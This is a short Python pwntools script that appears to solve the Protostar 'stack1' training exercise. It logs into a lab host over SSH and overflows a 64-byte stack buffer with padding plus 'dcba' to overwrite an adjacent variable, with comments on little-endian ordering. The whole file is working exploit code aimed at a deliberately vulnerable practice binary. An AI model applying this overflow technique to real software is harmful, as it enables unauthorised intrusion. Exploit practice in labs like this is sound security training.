from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

# Once again, the variable is next to the buffer on the stack.
# The memory is little endian, so we need to enter the chars backwards
bash.sendline('/opt/protostar/bin/stack1 $(python -c "print \'a\'*64 + \'dcba\'")')
print(bash.recvline())